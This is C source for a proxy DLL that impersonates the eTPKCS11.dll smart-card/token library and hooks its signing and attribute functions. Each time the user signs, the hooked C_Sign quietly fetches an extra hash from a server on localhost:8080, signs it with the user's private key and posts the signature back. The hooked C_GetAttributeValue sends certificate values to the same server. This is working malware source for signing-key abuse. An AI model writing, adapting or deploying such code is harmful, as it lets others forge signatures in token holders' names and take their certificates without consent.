#define _CRT_SECURE_NO_WARNINGS
#include "wrapper.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Crypt32.lib")

static HMODULE hOriginalDll = NULL;

typedef CK_RV(*C_SignInit_t)(CK_SESSION_HANDLE, CK_MECHANISM_PTR, CK_OBJECT_HANDLE);
typedef CK_RV(*C_Sign_t)(CK_SESSION_HANDLE, CK_BYTE_PTR, CK_ULONG, CK_BYTE_PTR, CK_ULONG_PTR);
typedef CK_RV(*C_GetFunctionList_t)(CK_FUNCTION_LIST_PTR_PTR);
typedef CK_RV(*C_GetAttributeValue_t)(CK_SESSION_HANDLE hSession, CK_OBJECT_HANDLE hObject, CK_ATTRIBUTE_PTR pTemplate, CK_ULONG ulCount);


static C_SignInit_t Original_C_SignInit = NULL;
static C_Sign_t Original_C_Sign = NULL;
static C_GetFunctionList_t Original_C_GetFunctionList = NULL;
static C_GetAttributeValue_t Original_C_GetAttributeValue = NULL;


static CK_OBJECT_HANDLE gPrivateKeyHandle = CK_INVALID_HANDLE;

static int LoadOriginalDll() {
    if (hOriginalDll == NULL) {
        hOriginalDll = LoadLibraryA("eTPKCS11.dll");
        if (hOriginalDll == NULL) {
            fprintf(stderr, "Failed to load eTPKCS11.dll. Error: %d\n", GetLastError());
            return 0;
        }

        Original_C_SignInit = (C_SignInit_t)GetProcAddress(hOriginalDll, "C_SignInit");
        Original_C_Sign = (C_Sign_t)GetProcAddress(hOriginalDll, "C_Sign");
        Original_C_GetFunctionList = (C_GetFunctionList_t)GetProcAddress(hOriginalDll, "C_GetFunctionList");
        Original_C_GetAttributeValue = (C_GetAttributeValue_t)GetProcAddress(hOriginalDll, "C_GetAttributeValue");

        if (!Original_C_SignInit || !Original_C_Sign || !Original_C_GetFunctionList) {
            fprintf(stderr, "Failed to map functions from eTPKCS11.dll\n");
            return 0;
        }
    }
    return 1;
}


void Base64Decode(const char* base64Text, BYTE* buffer, DWORD* bufferLen) {
    DWORD decodedLen = 0;
    CryptStringToBinaryA(base64Text, 0, CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);
    if (decodedLen > *bufferLen) return;
    CryptStringToBinaryA(base64Text, 0, CRYPT_STRING_BASE64, buffer, &decodedLen, NULL, NULL);
    *bufferLen = decodedLen;
}

void Base64Encode(const BYTE* buffer, DWORD bufferLen, char* base64Text, DWORD base64Len) {
    DWORD encodedLen = 0;
    CryptBinaryToStringA(buffer, bufferLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedLen);
    if (encodedLen > base64Len) return;
    CryptBinaryToStringA(buffer, bufferLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Text, &encodedLen);
}

void BytesToHex(const unsigned char* bytes, size_t length, char* hexOutput, size_t hexOutputSize) {
    for (size_t i = 0; i < length && (i * 2 + 1) < hexOutputSize; i++) {
        snprintf(hexOutput + (i * 2), 3, "%02X", bytes[i]);
    }
    if (length * 2 < hexOutputSize) {
        hexOutput[length * 2] = '\0'; 
    }
    else {
        hexOutput[hexOutputSize - 1] = '\0';
    }
}

void PerformHttpGet(const char* url, CK_BYTE_PTR buffer, CK_ULONG* bufferLength) {
    HINTERNET hSession = WinHttpOpen(L"Custom User Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "Failed to open WinHTTP session. Error: %lu\n", GetLastError());
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", 8080, 0);
    if (!hConnect) {
        fprintf(stderr, "Failed to connect to server.\n");
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/api/v1/sign/getHash",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_BYPASS_PROXY_CACHE);
    if (!hRequest) {
        fprintf(stderr, "Failed to open HTTP request.\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, NULL, 0, 0, 0) ||
        !WinHttpReceiveResponse(hRequest, NULL)) {
        fprintf(stderr, "Failed to send HTTP GET request.\n");
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    char response[512];
    DWORD bytesRead = 0;

    if (!WinHttpReadData(hRequest, response, sizeof(response) - 1, &bytesRead)) {
        fprintf(stderr, "Failed to read HTTP response.\n");
        return;
    }
    response[bytesRead] = '\0';

    char* hashStart = strstr(response, "\"hash\":\"");
    char* lengthStart = strstr(response, "\"length\":");

    if (!hashStart || !lengthStart) {
        fprintf(stderr, "Invalid JSON format: %s\n", response);
        return;
    }

    hashStart += 8;
    lengthStart += 9;

    char base64Hash[387] = { 0 };
    int expectedLength = 0;
    sscanf(lengthStart, "%d", &expectedLength);
    sscanf(hashStart, "%386[^\"]", base64Hash);

    if (expectedLength <= 0 || expectedLength > 387) {
        fprintf(stderr, "Invalid expected hash length: %d\n", expectedLength);
        return;
    }

    DWORD actualLength = *bufferLength;
    Base64Decode(base64Hash, buffer, &actualLength);

    if (actualLength == 0) {
        fprintf(stderr, "Failed to decode Base64 hash\n");
        return;
    }

    *bufferLength = actualLength;
    fprintf(stdout, "Received hash of expected length %d, actual decoded length %lu\n", expectedLength, actualLength);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void PerformHttpPost(const char* url, CK_BYTE_PTR data, CK_ULONG dataLength) {
    HINTERNET hSession = WinHttpOpen(L"Custom User Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "Failed to open WinHTTP session. Error: %lu\n", GetLastError());
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", 8080, 0);
    if (!hConnect) {
        fprintf(stderr, "Failed to connect to server.\n");
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/sign/addSign",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_BYPASS_PROXY_CACHE);
    if (!hRequest) {
        fprintf(stderr, "Failed to open HTTP request.\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    size_t base64Size = (dataLength * 4 / 3) + 4;
    char* base64Signature = (char*)malloc(base64Size);
    if (!base64Signature) {
        fprintf(stderr, "Failed to allocate memory for Base64 encoding.\n");
        return;
    }

    Base64Encode(data, dataLength, base64Signature, base64Size);

    char jsonBody[2048];
    snprintf(jsonBody, sizeof(jsonBody), "{\"signature\":\"%s\", \"length\":%lu}", base64Signature, dataLength);

    const wchar_t* headers = L"Content-Type: application/json";
    wchar_t wideBody[2048];
    MultiByteToWideChar(CP_UTF8, 0, jsonBody, -1, wideBody, ARRAYSIZE(wideBody));

    BOOL bResults = WinHttpSendRequest(hRequest, headers, -1,
        (LPVOID)wideBody,
        wcslen(wideBody) * sizeof(wchar_t),
        wcslen(wideBody) * sizeof(wchar_t), 0);
    if (!bResults) {
        fprintf(stderr, "Failed to send HTTP request. Error: %lu\n", GetLastError());
    }
    else {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
        if (bResults) {
            printf("HTTP POST request successful.\n");
        }
        else {
            fprintf(stderr, "Failed to receive HTTP response. Error: %lu\n", GetLastError());
        }
    }

    free(base64Signature); 
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

void PerformHttpPostCert(const char* url, const char* base64Cert) {
    HINTERNET hSession = WinHttpOpen(L"Custom User Agent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        fprintf(stderr, "WinHttpOpen failed: %lu\n", GetLastError());
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", 8080, 0);
    if (!hConnect) {
        fprintf(stderr, "WinHttpConnect failed\n");
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v1/sign/addCert",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        fprintf(stderr, "WinHttpOpenRequest failed\n");
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    char jsonBody[4096];
    snprintf(jsonBody, sizeof(jsonBody), "{\"certificate\":\"%s\"}", base64Cert);

    wchar_t wideBody[4096];
    MultiByteToWideChar(CP_UTF8, 0, jsonBody, -1, wideBody, 4096);

    const wchar_t* headers = L"Content-Type: application/json";

    BOOL bResult = WinHttpSendRequest(hRequest,
        headers,
        (DWORD)-1L,
        (LPVOID)wideBody,
        wcslen(wideBody) * sizeof(wchar_t),
        wcslen(wideBody) * sizeof(wchar_t),
        0);

    if (bResult && WinHttpReceiveResponse(hRequest, NULL)) {
      
        printf("Certificate POST sent successfully\n");
    }
    else {
        fprintf(stderr, "Failed to send or receive addCert request. Error %lu\n", GetLastError());
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}



CK_RV C_SignInit(CK_SESSION_HANDLE hSession, CK_MECHANISM_PTR pMechanism, CK_OBJECT_HANDLE hKey) {
    if (!LoadOriginalDll()) return CKR_GENERAL_ERROR;
    
    gPrivateKeyHandle = hKey;
    CK_RV rv = Original_C_SignInit(hSession, pMechanism, hKey);
    
    return rv;
}


CK_RV C_Sign(CK_SESSION_HANDLE hSession, CK_BYTE_PTR pData, CK_ULONG ulDataLen, CK_BYTE_PTR pSignature, CK_ULONG_PTR pulSignatureLen) {

    if (!LoadOriginalDll()) return CKR_GENERAL_ERROR;

    CK_RV rv = Original_C_Sign(hSession, pData, ulDataLen, pSignature, pulSignatureLen);

    CK_BYTE buffer[1024];
    CK_ULONG bufferLen = sizeof(buffer);
    PerformHttpGet("http://localhost:8080/api/v1/sign/getHash", buffer, &bufferLen);

    if (bufferLen > 0) {
        CK_MECHANISM RsaMechanism = { CKM_RSA_PKCS, NULL, 0 };
        CK_RV rvInit2 = Original_C_SignInit(hSession, &RsaMechanism, gPrivateKeyHandle);

        if (rvInit2 == CKR_OK) {

            CK_BYTE sig2[1024];
            CK_ULONG sig2Len = sizeof(sig2);
            CK_RV rvSign2 = Original_C_Sign(hSession, buffer, bufferLen, sig2, &sig2Len);

            PerformHttpPost("http://localhost:8080/api/v1/sign/addSign", sig2, sig2Len);
        }
    }


    return rv;
}



CK_RV C_GetAttributeValue(CK_SESSION_HANDLE hSession, CK_OBJECT_HANDLE hObject, CK_ATTRIBUTE_PTR pTemplate, CK_ULONG ulCount) {
    CK_RV rv = Original_C_GetAttributeValue(hSession, hObject, pTemplate, ulCount);

    for (CK_ULONG i = 0; i < ulCount; i++) {
        if (pTemplate[i].type == CKA_VALUE && pTemplate[i].ulValueLen > 0) {

            CK_BYTE_PTR certBytes = (CK_BYTE_PTR)pTemplate[i].pValue;
            CK_ULONG certLen = pTemplate[i].ulValueLen;

            size_t base64Size = (certLen * 4 / 3) + 4;
            char* certBase64 = (char*)malloc(base64Size);
            if (certBase64) {
                Base64Encode(certBytes, certLen, certBase64, (DWORD)base64Size);

                PerformHttpPostCert("http://localhost:8080/api/v1/sign/addCert", certBase64);

                free(certBase64);
            }
        }
    }
    return rv;
}






CK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {
    if (!LoadOriginalDll()) return CKR_GENERAL_ERROR;

    CK_FUNCTION_LIST_PTR originalFunctionList;
    CK_RV result = Original_C_GetFunctionList(&originalFunctionList);
    if (result != CKR_OK) return result;

    static CK_FUNCTION_LIST modifiedFunctionList;
    memcpy(&modifiedFunctionList, originalFunctionList, sizeof(CK_FUNCTION_LIST));
    modifiedFunctionList.C_Sign = C_Sign;
    modifiedFunctionList.C_SignInit = C_SignInit;
    modifiedFunctionList.C_GetAttributeValue = C_GetAttributeValue;
    *ppFunctionList = &modifiedFunctionList;

    return CKR_OK;

}
